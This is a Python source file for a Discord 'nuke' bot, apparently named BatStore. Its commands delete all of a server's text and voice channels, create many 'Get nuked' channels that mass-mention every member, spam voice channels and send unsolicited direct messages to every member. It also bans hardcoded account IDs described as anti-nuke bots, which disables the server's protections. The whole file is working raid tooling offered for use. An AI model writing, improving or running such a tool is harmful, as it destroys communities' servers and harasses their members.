import discord
from discord.ext import commands



print("██████╗░████████╗░█████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░")
print("██╔══██╗╚══██╔══╝██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░")
print("██████╦╝░░░██║░░░███████║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░")
print("██╔══██╗░░░██║░░░██╔══██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░")
print("██████╦╝░░░██║░░░██║░░██║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗")
print("╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝")
print("BatStore")



bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())



@bot.event
async def on_ready():
    print(f'{bot.user.name} is online.')
    print('(prfix !)commands:\n ping = pong \n spam1 = only now channels \n anti = ban all anti nuke bots \n nuke (nuber) = nuke\n delete= delete all channels\n vcspam = voice chat spam\n example = !nuke 23 \n--------------------------')



@bot.command(name='ping')
async def ping(ctx):
    await ctx.send('pong')

@bot.command(name= "spam1")
async def create_text_channels(ctx, number: int):
    members = ctx.guild.members
    mentions = [member.mention for member in members]
    for i in range(number):
        channel = await ctx.guild.create_text_channel(f'Get nuked {i+1}')
        await channel.send('Get nuked'.join(mentions))

@bot.command(name= "anti")
async def ban(ctx):
    banned_users = ["1068943672541978684","515067662028636170","769772015447703592","651095740390834176","536991182035746816"]
    for user in banned_users:
        user_to_ban = await bot.fetch_user(user)
        await ctx.guild.ban(user_to_ban)
        print(user + "was banned")
        print("If is another anti nuke bot kick/ban him")

@bot.command(name= "nuke")
async def create_text_channels(ctx, number: int):
    for channel in ctx.guild.text_channels:
        await channel.delete()
    for channel in ctx.guild.voice_channels:
        await channel.delete()

    members = ctx.guild.members
    mentions = [member.mention for member in members]
    for i in range(number):
        channel = await ctx.guild.create_text_channel(f'Get nuked {i+1}')
        await channel.send('Get nuked'.join(mentions))

@bot.command(name="delete")
async def delete_channels(ctx):
    for channel in ctx.guild.text_channels:
        await channel.delete()
    for channel in ctx.guild.voice_channels:
        await channel.delete()

@bot.command(name= "vcspam")
async def create_voice_channels(ctx, number: int):
    for i in range(number):
        await ctx.guild.create_voice_channel(f'get nuked {i+1}')

@bot.command(name="ms")
async def mass_message(ctx, message: str):
    for member in ctx.guild.members:
        try:
            await ctx.channel.purge(limit=1, check=lambda m: m.author == ctx.author)
            await member.send(message)
        except:
            pass

f70 = input("Paste bot token: ")
bot.run(f70)










